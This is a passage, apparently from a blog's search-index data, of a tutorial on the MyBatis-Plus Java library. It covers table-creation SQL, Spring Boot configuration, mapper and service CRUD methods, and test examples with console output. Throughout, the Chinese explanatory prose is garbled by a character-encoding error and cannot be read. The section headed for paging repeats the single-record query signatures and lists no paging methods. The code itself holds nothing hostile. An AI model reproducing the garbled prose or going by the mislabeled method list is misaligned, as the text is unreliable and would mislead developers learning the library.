</tr>\n</tbody></table>\n","tags":["MyBatis","Spring","SpringMVC"],"categories":["Spring"]},{"title":"MyBatis-Plus","url":"/posts/11146.html","content":"\nMyBatis-Plusï¼ˆç®€ç§° MPï¼‰æ˜¯ä¸€ä¸ª MyBatis çš„å¢å¼ºå·¥å…·ï¼Œåœ¨ MyBatis çš„åŸºç¡€ä¸Šåªåšå¢å¼ºä¸åšæ”¹å˜ï¼Œä¸ºç®€åŒ–å¼€å‘ã€æé«˜æ•ˆç‡è€Œç”Ÿã€‚\n\n## ä¸€ã€å¿«é€Ÿå…¥é—¨\n\n### 1.å»ºåº“å»ºè¡¨\n\nç°æœ‰ä¸€å¼  `User` è¡¨ï¼Œå…¶è¡¨ç»“æ„å¦‚ä¸‹ï¼š\n\n| id   | name   | age  | email              |\n| ---- | ------ | ---- | ------------------ |\n| 1    | Jone   | 18   | test1@baomidou.com |\n| 2    | Jack   | 20   | test2@baomidou.com |\n| 3    | Tom    | 28   | test3@baomidou.com |\n| 4    | Sandy  | 21   | test4@baomidou.com |\n| 5    | Billie | 24   | test5@baomidou.com |\n\n**a>åˆ›å»ºåº“&è¡¨**\n\n```sql\nCREATE DATABASE `mybatis_plus`;\nuse `mybatis_plus`;\nDROP TABLE IF EXISTS user;\nCREATE TABLE user\n(\n\tid BIGINT(20) NOT NULL COMMENT 'ä¸»é”®ID',\n\tname VARCHAR(30) NULL DEFAULT NULL COMMENT 'å§“å',\n\tage INT(11) NULL DEFAULT NULL COMMENT 'å¹´é¾„',\n\temail VARCHAR(50) NULL DEFAULT NULL COMMENT 'é‚®ç®±',\n\tPRIMARY KEY (id)\n)ENGINE=InnoDB DEFAULT CHARSET=utf8;\n```\n\n**b>æ·»åŠ æ•°æ®**\n\n```sql\nINSERT INTO user (id, name, age, email) VALUES\n(1, 'Jone', 18, 'test1@baomidou.com'),\n(2, 'Jack', 20, 'test2@baomidou.com'),\n(3, 'Tom', 28, 'test3@baomidou.com'),\n(4, 'Sandy', 21, 'test4@baomidou.com'),\n(5, 'Billie', 24, 'test5@baomidou.com');\n```\n\n------\n\n### 2.åˆ›å»ºå·¥ç¨‹\n\n**a>ä½¿ç”¨`Spring Initializer`å¿«é€Ÿåˆå§‹åŒ–ä¸€ä¸ª Spring Boot å·¥ç¨‹**\n\n- å‹¾é€‰ MySQL é©±åŠ¨ã€Lombok\n\n**b>å¼•å…¥`MyBatis-Plus`çš„ä¾èµ–**\n\n```xml\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>mybatis-plus-boot-starter</artifactId>\n    <version>3.5.1</version>\n</dependency>\n```\n\n### 3.ç¼–å†™ä»£ç \n\n**a>é…ç½®`application.yml`æ–‡ä»¶**\n\n```yaml\nspring:\n  #é…ç½®æ•°æ®æº\n  datasource:\n    #é…ç½®æ•°æ®æºç±»å‹\n    type: com.zaxxer.hikari.HikariDataSource\n    #é…ç½®è¿æ¥æ•°æ®åº“çš„ä¿¡æ¯\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://localhost:3306/mybatis_plus?characterEncoding=utf-8&useSSL=false\n    username: root\n    password: root\n\n#MyBatis-Plusç›¸å…³é…ç½®\nmybatis-plus:\n  configuration:\n    #é…ç½®æ—¥å¿—\n    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl\n```\n\n**b>åœ¨ Spring Boot å¯åŠ¨ç±»ä¸­æ·»åŠ  `@MapperScan` æ³¨è§£ï¼Œæ‰«æ Mapper æ–‡ä»¶å¤¹**\n\n```java\n@SpringBootApplication\n@MapperScan(\"æŒ‡å®šMapperæ¥å£æ‰€åœ¨çš„åŒ…\")\npublic class MybatisPlusDemoApplication {\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(MybatisPlusDemoApplication.class, args);\n\t}\n}\n```\n\n**c>ç¼–å†™å®ä½“ç±» `User.java`ï¼ˆæ­¤å¤„ä½¿ç”¨äº† Lombok ç®€åŒ–ä»£ç ï¼‰**\n\n```java\n@Data\npublic class User {\n    private Long id;\n    private String name;\n    private Integer age;\n    private String email;\n}\n```\n\n**d>ç¼–å†™ Mapper åŒ…ä¸‹çš„ `UserMapper`æ¥å£**\n\nBaseMapperæ˜¯MyBatis-Plusæä¾›çš„æ¨¡æ¿mapperï¼Œå…¶ä¸­åŒ…å«äº†åŸºæœ¬çš„CRUDæ–¹æ³•ï¼Œæ³›å‹ä¸ºæ“ä½œçš„å®ä½“ç±»å‹\n\n```java\npublic interface UserMapper extends BaseMapper<User> {}\n```\n\n### 4.æµ‹è¯•æŸ¥è¯¢\n\n**ç¼–å†™ä¸€ä¸ªæµ‹è¯•ç±»`MyBatisPlusTest.java`**\n\n```java\n@SpringBootTest\npublic class MyBatisPlusTest {\n    @Autowired\n    private UserMapper userMapper;\n    /**\n     * æµ‹è¯•æŸ¥è¯¢æ‰€æœ‰æ•°æ®\n     */\n    @Test\n    void testSelectList(){\n        //é€šè¿‡æ¡ä»¶æ„é€ å™¨æŸ¥è¯¢ä¸€ä¸ªlisté›†åˆï¼Œè‹¥æ²¡æœ‰æ¡ä»¶ï¼Œåˆ™å¯ä»¥è®¾ç½®nullä¸ºå‚æ•°\n        List<User> users = userMapper.selectList(null);\n        users.forEach(System.out::println);\n    }\n}\n```\n\n**æ§åˆ¶å°æ‰“å°æŸ¥è¯¢ç»“æœ**\n\n```\nUser(id=1, name=Jone, age=18, email=test1@baomidou.com)\nUser(id=2, name=Jack, age=20, email=test2@baomidou.com)\nUser(id=3, name=Tom, age=28, email=test3@baomidou.com)\nUser(id=4, name=Sandy, age=21, email=test4@baomidou.com)\nUser(id=5, name=Billie, age=24, email=test5@baomidou.com)\n```\n\n## äºŒã€åŸºæœ¬CRUD\n\n### 1.Mapper CRUD æ¥å£\n\né€šç”¨ CRUD å°è£… `BaseMapper` æ¥å£ï¼Œä¸º `Mybatis-Plus` å¯åŠ¨æ—¶è‡ªåŠ¨è§£æå®ä½“è¡¨å…³ç³»æ˜ å°„è½¬æ¢ä¸º `Mybatis` å†…éƒ¨å¯¹è±¡æ³¨å…¥å®¹å™¨ï¼ŒMyBatis-Plus ä¸­å†…ç½®çš„ BaseMapper ä¸­éƒ½å·²å¾—åˆ°äº†å®ç°ï¼Œå› æ­¤æˆ‘ä»¬ç»§æ‰¿è¯¥æ¥å£ä»¥åå¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚\n\n```java\npublic interface UserMapper extends BaseMapper<User> {\n}\n```\n\n> **BaseMapperä¸­æä¾›çš„CRUDæ–¹æ³•ï¼š**\n\n#### **å¢åŠ ï¼šInsert**\n\n```java\n// æ’å…¥ä¸€æ¡è®°å½•\nint insert(T entity);\n```\n\n#### **åˆ é™¤ï¼šDelete**\n\n```java\n// æ ¹æ® entity æ¡ä»¶ï¼Œåˆ é™¤è®°å½•\nint delete(@Param(Constants.WRAPPER) Wrapper<T> wrapper);\n// æ ¹æ® ID æ‰¹é‡åˆ é™¤\nint deleteBatchIds(@Param(Constants.COLLECTION) Collection<? extends Serializable> idList);\n// æ ¹æ® ID åˆ é™¤\nint deleteById(Serializable id);\n// æ ¹æ® columnMap æ¡ä»¶ï¼Œåˆ é™¤è®°å½•\nint deleteByMap(@Param(Constants.COLUMN_MAP) Map<String, Object> columnMap);\n```\n\n#### **ä¿®æ”¹ï¼šUpdate**\n\n```java\n// æ ¹æ® whereWrapper æ¡ä»¶ï¼Œæ›´æ–°è®°å½•\nint update(@Param(Constants.ENTITY) T updateEntity, @Param(Constants.WRAPPER) Wrapper<T> whereWrapper);\n// æ ¹æ® ID ä¿®æ”¹\nint updateById(@Param(Constants.ENTITY) T entity);\n```\n\n#### **æŸ¥è¯¢ï¼šSelete**\n\n```java\n// æ ¹æ® ID æŸ¥è¯¢\nT selectById(Serializable id);\n// æ ¹æ® entity æ¡ä»¶ï¼ŒæŸ¥è¯¢ä¸€æ¡è®°å½•\nT selectOne(@Param(Constants.WRAPPER) Wrapper<T> queryWrapper);\n\n// æ ¹æ®ID æ‰¹é‡æŸ¥è¯¢\nList<T> selectBatchIds(@Param(Constants.COLLECTION) Collection<? extends Serializable> idList);\n// æ ¹æ® entity æ¡ä»¶ï¼ŒæŸ¥è¯¢å…¨éƒ¨è®°å½•\nList<T> selectList(@Param(Constants.WRAPPER) Wrapper<T> queryWrapper);\n// æŸ¥è¯¢ï¼ˆæ ¹æ® columnMap æ¡ä»¶ï¼‰\nList<T> selectByMap(@Param(Constants.COLUMN_MAP) Map<String, Object> columnMap);\n// æ ¹æ® Wrapper æ¡ä»¶ï¼ŒæŸ¥è¯¢å…¨éƒ¨è®°å½•\nList<Map<String, Object>> selectMaps(@Param(Constants.WRAPPER) Wrapper<T> queryWrapper);\n// æ ¹æ® Wrapper æ¡ä»¶ï¼ŒæŸ¥è¯¢å…¨éƒ¨è®°å½•ã€‚æ³¨æ„ï¼š åªè¿”å›ç¬¬ä¸€ä¸ªå­—æ®µçš„å€¼\nList<Object> selectObjs(@Param(Constants.WRAPPER) Wrapper<T> queryWrapper);\n\n// æ ¹æ® entity æ¡ä»¶ï¼ŒæŸ¥è¯¢å…¨éƒ¨è®°å½•ï¼ˆå¹¶ç¿»é¡µï¼‰\nIPage<T> selectPage(IPage<T> page, @Param(Constants.WRAPPER) Wrapper<T> queryWrapper);\n// æ ¹æ® Wrapper æ¡ä»¶ï¼ŒæŸ¥è¯¢å…¨éƒ¨è®°å½•ï¼ˆå¹¶ç¿»é¡µï¼‰\nIPage<Map<String, Object>> selectMapsPage(IPage<T> page, @Param(Constants.WRAPPER) Wrapper<T> queryWrapper);\n// æ ¹æ® Wrapper æ¡ä»¶ï¼ŒæŸ¥è¯¢æ€»è®°å½•æ•°\nInteger selectCount(@Param(Constants.WRAPPER) Wrapper<T> queryWrapper);\n```\n\n### 2.è°ƒç”¨Mapperå®ç°CRUD\n\n```java\n@SpringBootTest\npublic class MyBatisPlusTest {\n    @Autowired\n    private UserMapper userMapper;\n  \n    @Test\n    public void testXXX(){\n      userMapper.xxxx();\n    }\n}\n```\n\n####  æ’å…¥\n\n---\n\n> **æœ€ç»ˆæ‰§è¡Œçš„ç»“æœï¼Œæ‰€è·å–çš„idä¸º1527206783590903810**\n>\n> **è¿™æ˜¯å› ä¸ºMyBatis-Plusåœ¨å®ç°æ’å…¥æ•°æ®æ—¶ï¼Œä¼šé»˜è®¤åŸºäºé›ªèŠ±ç®—æ³•çš„ç­–ç•¥ç”Ÿæˆid**\n\n```java\n/**\n  * æµ‹è¯•æ’å…¥ä¸€æ¡æ•°æ®\n  * MyBatis-Plusåœ¨å®ç°æ’å…¥æ•°æ®æ—¶ï¼Œä¼šé»˜è®¤åŸºäºé›ªèŠ±ç®—æ³•çš„ç­–ç•¥ç”Ÿæˆid\n  */\n@Test\npublic void testInsert(){\n  User user = new User();\n  user.setName(\"jianjian\");\n  user.setAge(21);\n  user.setEmail(\"jianjian@123.com\");\n  int result = userMapper.insert(user);\n  System.out.println(result > 0 ? \"æ·»åŠ æˆåŠŸï¼\" : \"æ·»åŠ å¤±è´¥ï¼\");\n  System.out.println(\"å—å½±å“çš„è¡Œæ•°ä¸ºï¼š\" + result);\n  System.out.println(\"idè‡ªåŠ¨è·å–ï¼š\" + user.getId());//å½“å‰ id ä¸ºé›ªèŠ±ç®—æ³•è‡ªåŠ¨ç”Ÿæˆçš„id\n}\n```\n\n```\næ·»åŠ æˆåŠŸï¼\nå—å½±å“çš„è¡Œæ•°ä¸ºï¼š1\nidè‡ªåŠ¨è·å–ï¼š1541252227434270722\n```\n\n####  åˆ é™¤\n\n---\n\n##### aã€æ ¹æ®IDåˆ é™¤æ•°æ®\n\n> **è°ƒç”¨æ–¹æ³•ï¼šint deleteById(Serializable id);**\n\n```java\n/**\n  * æµ‹è¯•æ ¹æ®idåˆ é™¤ä¸€æ¡æ•°æ®\n  */\n@Test\npublic void testDeleteById(){\n  int result = userMapper.deleteById(1541252227434270722L);\n  System.out.println(result > 0 ? \"åˆ é™¤æˆåŠŸï¼\" : \"åˆ é™¤å¤±è´¥ï¼\");\n  System.out.println(\"å—å½±å“çš„è¡Œæ•°ä¸ºï¼š\" + result);\n}\n```\n\n```\nåˆ é™¤æˆåŠŸï¼\nå—å½±å“çš„è¡Œæ•°ä¸ºï¼š1\n```\n\n##### bã€æ ¹æ®IDæ‰¹é‡åˆ é™¤æ•°æ®\n\n> **è°ƒç”¨æ–¹æ³•ï¼šint deleteBatchIds(@Param(Constants.COLLECTION) Collection<? extends Serializable> idList);**\n\n```java\n/**\n  * æµ‹è¯•é€šè¿‡idæ‰¹é‡åˆ é™¤æ•°æ®\n  */\n@Test\npublic void testDeleteBatchIds(){\n  List<Long> ids = Arrays.asList(6L, 7L, 8L);\n  int result = userMapper.deleteBatchIds(ids);\n  System.out.println(result > 0 ? \"åˆ é™¤æˆåŠŸï¼\" : \"åˆ é™¤å¤±è´¥ï¼\");\n  System.out.println(\"å—å½±å“çš„è¡Œæ•°ä¸ºï¼š\" + result);\n}\n```\n\n```\nåˆ é™¤å¤±è´¥ï¼\nå—å½±å“çš„è¡Œæ•°ä¸ºï¼š0\n```\n\n##### cã€æ ¹æ®Mapæ¡ä»¶åˆ é™¤æ•°æ®\n\n> **è°ƒç”¨æ–¹æ³•ï¼šint deleteByMap(@Param(Constants.COLUMN_MAP) Map<String, Object> columnMap);**\n\n```java\n/**\n   * æµ‹è¯•æ ¹æ®Mapé›†åˆä¸­æ‰€è®¾ç½®çš„æ¡ä»¶åˆ é™¤æ•°æ®\n   */\n@Test\npublic void testDeleteByMap(){\n  //å½“å‰æ¼”ç¤ºä¸ºæ ¹æ®nameå’Œageåˆ é™¤æ•°æ®\n  //æ‰§è¡ŒSQLä¸ºï¼šDELETE FROM user WHERE name = ? AND age = ?\n  Map<String,Object> map = new HashMap<>();\n  map.put(\"name\",\"jianjian\");\n  map.put(\"age\",21);\n  int result = userMapper.deleteByMap(map);\n  System.out.println(result > 0 ? \"åˆ é™¤æˆåŠŸï¼\" : \"åˆ é™¤å¤±è´¥ï¼\");\n  System.out.println(\"å—å½±å“çš„è¡Œæ•°ä¸ºï¼š\" + result);\n}\n```\n\n#### ä¿®æ”¹\n\n> **è°ƒç”¨æ–¹æ³•ï¼šint updateById(@Param(Constants.ENTITY) T entity);**\n\n```java\n/**\n  * æµ‹è¯•æ ¹æ®idä¿®æ”¹ç”¨æˆ·ä¿¡æ¯\n  */\n@Test\npublic void testUpdateById(){\n  //æ‰§è¡ŒSQLä¸ºï¼š UPDATE user SET name=?, age=?, email=? WHERE id=?\n  User user = new User();\n  user.setId(6L);\n  user.setName(\"jianjian\");\n  user.setAge(18);\n  user.setEmail(\"jianjian@123.com\");\n  int result = userMapper.updateById(user);\n  System.out.println(result > 0 ? \"ä¿®æ”¹æˆåŠŸï¼\" : \"ä¿®æ”¹å¤±è´¥ï¼\");\n  System.out.println(\"å—å½±å“çš„è¡Œæ•°ä¸ºï¼š\" + result);\n}\n```\n\n#### æŸ¥è¯¢\n\n---\n\n##### aã€æ ¹æ®IDæŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯\n\n> **è°ƒç”¨æ–¹æ³•ï¼šT selectById(Serializable id);**\n\n```java\n/**\n  * æµ‹è¯•æ ¹æ®idæŸ¥è¯¢ç”¨æˆ·æ•°æ®\n  */\n@Test\npublic void testSelectById(){\n  User user = userMapper.selectById(1L);\n  System.out.println(user);\n}\n```\n\n```\nUser(id=1, name=Jone, age=18, email=test1@baomidou.com)\n```\n\n##### bã€æ ¹æ®å¤šä¸ªIDæŸ¥è¯¢å¤šä¸ªç”¨æˆ·ä¿¡æ¯\n\n> **è°ƒç”¨æ–¹æ³•ï¼šList\\<T> selectBatchIds(@Param(Constants.COLLECTION) Collection<? extends Serializable> idList);**\n\n```java\n/**\n  * æ ¹æ®å¤šä¸ªidæŸ¥è¯¢ç”¨æˆ·æ•°æ®\n  */\n@Test\npublic void testSelectBatchIds(){\n  //æ‰§è¡ŒSQLä¸ºï¼šSELECT id,name,age,email FROM user WHERE id IN ( ? , ? , ? )\n  List<Long> ids = Arrays.asList(1L,2L,3L);\n  List<User> users = userMapper.selectBatchIds(ids);\n  users.forEach(System.out::println);\n}\n```\n\n```\nUser(id=1, name=Jone, age=18, email=test1@baomidou.com)\nUser(id=2, name=Jack, age=20, email=test2@baomidou.com)\nUser(id=3, name=Tom, age=28, email=test3@baomidou.com)\n```\n\n##### cã€æ ¹æ®Mapæ¡ä»¶æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯\n\n> **è°ƒç”¨æ–¹æ³•ï¼šList\\<T> selectByMap(@Param(Constants.COLUMN_MAP) Map<String, Object> columnMap);**\n\n```java\n/**\n  * æ ¹æ®Mapæ‰€è®¾ç½®çš„æ¡ä»¶æŸ¥è¯¢ç”¨æˆ·\n  */\n@Test\npublic void testSelectByMap(){\n  //æ‰§è¡ŒSQLä¸ºï¼šSELECT id,name,age,email FROM user WHERE age = ?\n  Map<String,Object> map = new HashMap<>();\n  map.put(\"age\",18);\n  List<User> users = userMapper.selectByMap(map);\n  users.forEach(System.out::println);\n}\n```\n\n```\nUser(id=1, name=Jone, age=18, email=test1@baomidou.com)\n```\n\n##### dã€æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯\n\n> **è°ƒç”¨æ–¹æ³•ï¼šList\\<T> selectList(@Param(Constants.WRAPPER) Wrapper\\<T> queryWrapper);**\n\n```java\n/**\n  * æµ‹è¯•æŸ¥è¯¢æ‰€æœ‰æ•°æ®\n  */\n@Test\npublic void testSelectList(){\n  List<User> users = userMapper.selectList(null);\n  users.forEach(System.out::println);\n}\n```\n\n```\nUser(id=1, name=Jone, age=18, email=test1@baomidou.com)\nUser(id=2, name=Jack, age=20, email=test2@baomidou.com)\nUser(id=3, name=Tom, age=28, email=test3@baomidou.com)\nUser(id=4, name=Sandy, age=21, email=test4@baomidou.com)\nUser(id=5, name=Billie, age=24, email=test5@baomidou.com)\n```\n\n### 3.Service CRUD æ¥å£\n\nService CRUD å°è£… `IService` æ¥å£ï¼Œè¿›ä¸€æ­¥å°è£… CRUD é‡‡ç”¨ `get æŸ¥è¯¢å•è¡Œ` `remove åˆ é™¤` `list æŸ¥è¯¢é›†åˆ` `page åˆ†é¡µ` å‰ç¼€å‘½åæ–¹å¼åŒºåˆ† `Mapper` å±‚é¿å…æ··æ·†\n\nMyBatis-Plusä¸­æœ‰ä¸€ä¸ªæ¥å£ **`IService`**å’Œå…¶å®ç°ç±» **`ServiceImpl`**ï¼Œå°è£…äº†å¸¸è§çš„ä¸šåŠ¡å±‚é€»è¾‘ï¼Œè¯¦æƒ…æŸ¥çœ‹æºç IService å’Œ ServiceImpl\n\nå› æ­¤æˆ‘ä»¬åœ¨ä½¿ç”¨çš„æ—¶å€™ä»…éœ€åœ¨è‡ªå·±å®šä¹‰çš„**`Service`**æ¥å£ä¸­ç»§æ‰¿**`IService`**æ¥å£ï¼Œåœ¨è‡ªå·±çš„å®ç°ç±»ä¸­å®ç°è‡ªå·±çš„Serviceå¹¶ç»§æ‰¿**`ServiceImpl`**å³å¯\n\n> **IServiceä¸­çš„CRUDæ–¹æ³•**\n\n#### **å¢åŠ ï¼šSaveã€SaveOrUpdate**\n\n```java\n// æ’å…¥ä¸€æ¡è®°å½•ï¼ˆé€‰æ‹©å­—æ®µï¼Œç­–ç•¥æ’å…¥ï¼‰\nboolean save(T entity);\n// æ’å…¥ï¼ˆæ‰¹é‡ï¼‰\nboolean saveBatch(Collection<T> entityList);\n// æ’å…¥ï¼ˆæ‰¹é‡ï¼‰\nboolean saveBatch(Collection<T> entityList, int batchSize);\n\n// TableId æ³¨è§£å­˜åœ¨æ›´æ–°è®°å½•ï¼Œå¦æ’å…¥ä¸€æ¡è®°å½•\nboolean saveOrUpdate(T entity);\n// æ ¹æ®updateWrapperå°è¯•æ›´æ–°ï¼Œå¦ç»§ç»­æ‰§è¡ŒsaveOrUpdate(T)æ–¹æ³•\nboolean saveOrUpdate(T entity, Wrapper<T> updateWrapper);\n// æ‰¹é‡ä¿®æ”¹æ’å…¥\nboolean saveOrUpdateBatch(Collection<T> entityList);\n// æ‰¹é‡ä¿®æ”¹æ’å…¥\nboolean saveOrUpdateBatch(Collection<T> entityList, int batchSize);\n```\n\n#### **åˆ é™¤ï¼šRemove**\n\n```java\n// æ ¹æ® entity æ¡ä»¶ï¼Œåˆ é™¤è®°å½•\nboolean remove(Wrapper<T> queryWrapper);\n// æ ¹æ® ID åˆ é™¤\nboolean removeById(Serializable id);\n// æ ¹æ® columnMap æ¡ä»¶ï¼Œåˆ é™¤è®°å½•\nboolean removeByMap(Map<String, Object> columnMap);\n// åˆ é™¤ï¼ˆæ ¹æ®ID æ‰¹é‡åˆ é™¤ï¼‰\nboolean removeByIds(Collection<? extends Serializable> idList);\n```\n\n#### **ä¿®æ”¹ï¼šUpdate**\n\n```java\n// æ ¹æ® UpdateWrapper æ¡ä»¶ï¼Œæ›´æ–°è®°å½• éœ€è¦è®¾ç½®sqlset\nboolean update(Wrapper<T> updateWrapper);\n// æ ¹æ® whereWrapper æ¡ä»¶ï¼Œæ›´æ–°è®°å½•\nboolean update(T updateEntity, Wrapper<T> whereWrapper);\n// æ ¹æ® ID é€‰æ‹©ä¿®æ”¹\nboolean updateById(T entity);\n// æ ¹æ®ID æ‰¹é‡æ›´æ–°\nboolean updateBatchById(Collection<T> entityList);\n// æ ¹æ®ID æ‰¹é‡æ›´æ–°\nboolean updateBatchById(Collection<T> entityList, int batchSize);\n```\n\n#### **æŸ¥è¯¢ï¼šGetã€Listã€Count**\n\n```java\n// æ ¹æ® ID æŸ¥è¯¢\nT getById(Serializable id);\n// æ ¹æ® Wrapperï¼ŒæŸ¥è¯¢ä¸€æ¡è®°å½•ã€‚ç»“æœé›†ï¼Œå¦‚æœæ˜¯å¤šä¸ªä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œéšæœºå–ä¸€æ¡åŠ ä¸Šé™åˆ¶æ¡ä»¶ wrapper.last(\"LIMIT 1\")\nT getOne(Wrapper<T> queryWrapper);\n// æ ¹æ® Wrapperï¼ŒæŸ¥è¯¢ä¸€æ¡è®°å½•\nT getOne(Wrapper<T> queryWrapper, boolean throwEx);\n// æ ¹æ® Wrapperï¼ŒæŸ¥è¯¢ä¸€æ¡è®°å½•\nMap<String, Object> getMap(Wrapper<T> queryWrapper);\n// æ ¹æ® Wrapperï¼ŒæŸ¥è¯¢ä¸€æ¡è®°å½•\n<V> V getObj(Wrapper<T> queryWrapper, Function<? super Object, V> mapper);\n\n\n// æŸ¥è¯¢æ‰€æœ‰\nList<T> list();\n// æŸ¥è¯¢åˆ—è¡¨\nList<T> list(Wrapper<T> queryWrapper);\n// æŸ¥è¯¢ï¼ˆæ ¹æ®ID æ‰¹é‡æŸ¥è¯¢ï¼‰\nCollection<T> listByIds(Collection<? extends Serializable> idList);\n// æŸ¥è¯¢ï¼ˆæ ¹æ® columnMap æ¡ä»¶ï¼‰\nCollection<T> listByMap(Map<String, Object> columnMap);\n// æŸ¥è¯¢æ‰€æœ‰åˆ—è¡¨\nList<Map<String, Object>> listMaps();\n// æŸ¥è¯¢åˆ—è¡¨\nList<Map<String, Object>> listMaps(Wrapper<T> queryWrapper);\n// æŸ¥è¯¢å…¨éƒ¨è®°å½•\nList<Object> listObjs();\n// æŸ¥è¯¢å…¨éƒ¨è®°å½•\n<V> List<V> listObjs(Function<? super Object, V> mapper);\n// æ ¹æ® Wrapper æ¡ä»¶ï¼ŒæŸ¥è¯¢å…¨éƒ¨è®°å½•\nList<Object> listObjs(Wrapper<T> queryWrapper);\n// æ ¹æ® Wrapper æ¡ä»¶ï¼ŒæŸ¥è¯¢å…¨éƒ¨è®°å½•\n<V> List<V> listObjs(Wrapper<T> queryWrapper, Function<? super Object, V> mapper);\n\n// æŸ¥è¯¢æ€»è®°å½•æ•°\nint count();\n// æ ¹æ® Wrapper æ¡ä»¶ï¼ŒæŸ¥è¯¢æ€»è®°å½•æ•°\nint count(Wrapper<T> queryWrapper);\n```\n\n#### **åˆ†é¡µï¼šPage**\n\n```java\n// æ ¹æ® ID æŸ¥è¯¢\nT getById(Serializable id);\n// æ ¹æ® Wrapperï¼ŒæŸ¥è¯¢ä¸€æ¡è®°å½•ã€‚ç»“æœé›†ï¼Œå¦‚æœæ˜¯å¤šä¸ªä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œéšæœºå–ä¸€æ¡åŠ ä¸Šé™åˆ¶æ¡ä»¶ wrapper.last(\"LIMIT 1\")\nT getOne(Wrapper<T> queryWrapper);\n// æ ¹æ® Wrapperï¼ŒæŸ¥è¯¢ä¸€æ¡è®°å½•\nT getOne(Wrapper<T> queryWrapper, boolean throwEx);\n// æ ¹æ® Wrapperï¼ŒæŸ¥è¯¢ä¸€æ¡è®°å½•\nMap<String, Object> getMap(Wrapper<T> queryWrapper);\n// æ ¹æ® Wrapperï¼ŒæŸ¥è¯¢ä¸€æ¡è®°å½•\n<V> V getObj(Wrapper<T> queryWrapper, Function<? super Object, V> mapper);\n```\n\n### 4.è°ƒç”¨Serviceå±‚æ“ä½œæ•°æ®\n\n> æˆ‘ä»¬åœ¨è‡ªå·±çš„Serviceæ¥å£ä¸­é€šè¿‡ç»§æ‰¿MyBatis-Plusæä¾›çš„IServiceæ¥å£ï¼Œä¸ä»…å¯ä»¥è·å¾—å…¶æä¾›çš„CRUDæ–¹æ³•ï¼Œè€Œä¸”è¿˜å¯ä»¥ä½¿ç”¨è‡ªèº«å®šä¹‰çš„æ–¹æ³•ã€‚\n\n#### åˆ›å»ºServiceæ¥å£å’Œå®ç°ç±»\n\n**a.åˆ›å»º`UserService`å¹¶ç»§æ‰¿`IService`**\n\n```java\n/**\n  * UserServiceç»§æ‰¿IServiceæ¨¡æ¿æä¾›çš„åŸºç¡€åŠŸèƒ½ \n  */\npublic interface UserService extends IService<User> {}\n```\n\n**b.åˆ›å»º`UserService`çš„å®ç°ç±»å¹¶ç»§æ‰¿`ServiceImpl`**\n\n```java\n/**\n  * ServiceImplå®ç°äº†IServiceï¼Œæä¾›äº†IServiceä¸­åŸºç¡€åŠŸèƒ½çš„å®ç° \n  * è‹¥ServiceImplæ— æ³•æ»¡è¶³ä¸šåŠ¡éœ€æ±‚ï¼Œåˆ™å¯ä»¥ä½¿ç”¨è‡ªå®šçš„UserServiceå®šä¹‰æ–¹æ³•ï¼Œå¹¶åœ¨å®ç°ç±»ä¸­å®ç°\n  */\n\n@Service\npublic class UserServiceImpl extends ServiceImpl<UserMapper,User> implements UserService{}\n```\n\n#### æµ‹è¯•æŸ¥è¯¢è®°å½•æ•°\n\n> **è°ƒç”¨æ–¹æ³•ï¼šint count();**\n\n```java\n@Test\npublic void testGetCount(){\n    //æŸ¥è¯¢æ€»è®°å½•æ•°\n    //æ‰§è¡Œçš„SQLä¸ºï¼šSELECT COUNT( * ) FROM user\n    long count = userService.count();\n    System.out.println(\"æ€»è®°å½•æ•°ï¼š\" + count);\n}\n```\n\n#### æµ‹è¯•æ‰¹é‡æ’å…¥æ•°æ®\n\n> **è°ƒç”¨æ–¹æ³•ï¼šboolean saveBatch(Collection\\<T> entityList);**\n\n```java\n@Test\npublic void test(){\n    List<User> list = new ArrayList<>();\n    for (int i = 1; i <= 10; i++) {\n        User user = new User();\n        user.setName(\"Vz\"+i);\n        user.setAge(20+i);\n        list.add(user);\n    }\n    boolean b = userService.saveBatch(list);\n    System.out.println(b ? \"æ·»åŠ æˆåŠŸï¼\" : \"æ·»åŠ å¤±è´¥ï¼\");\n}\n```\n\n## ä¸‰ã€å¸¸ç”¨æ³¨è§£\n\n> MyBatis-Plusæä¾›çš„æ³¨è§£å¯ä»¥å¸®æˆ‘ä»¬è§£å†³ä¸€äº›æ•°æ®åº“ä¸å®ä½“ä¹‹é—´ç›¸äº’æ˜ å°„çš„é—®é¢˜ã€‚\n\n### 1.@TableName\n\n> ç»è¿‡ä»¥ä¸Šçš„æµ‹è¯•ï¼Œåœ¨ä½¿ç”¨MyBatis-Pluså®ç°åŸºæœ¬çš„CRUDæ—¶ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰æŒ‡å®šè¦æ“ä½œçš„è¡¨ï¼Œåªæ˜¯åœ¨Mapperæ¥å£ç»§æ‰¿BaseMapperæ—¶ï¼Œè®¾ç½®äº†æ³›å‹Userï¼Œè€Œæ“ä½œçš„è¡¨ä¸ºuserè¡¨ï¼Œç”±æ­¤å¾—å‡ºç»“è®ºï¼ŒMyBatis-Plusåœ¨ç¡®å®šæ“ä½œçš„è¡¨æ—¶ï¼Œç”±BaseMapperçš„æ³›å‹å†³å®šï¼Œå³å®ä½“ç±»å‹å†³å®šï¼Œä¸”é»˜è®¤æ“ä½œçš„è¡¨åå’Œå®ä½“ç±»å‹çš„ç±»åä¸€è‡´ã€‚\n\n#### 1.1\tå¼•å‡ºé—®é¢˜\n\n---\n\n> **è‹¥å®ä½“ç±»ç±»å‹çš„ç±»åå’Œè¦æ“ä½œçš„è¡¨çš„è¡¨åä¸ä¸€è‡´ï¼Œä¼šå‡ºç°ä»€ä¹ˆé—®é¢˜ï¼Ÿ**\n\næˆ‘ä»¬å°†è¡¨`user`æ›´åä¸º`t_user`ï¼Œæµ‹è¯•æŸ¥è¯¢åŠŸèƒ½\n\n![](https://img.jwt1399.top/img/202207031137784.png)\n\nç¨‹åºæŠ›å‡ºå¼‚å¸¸ï¼Œ**Table 'mybatis_plus.user' doesn't exist**ï¼Œå› 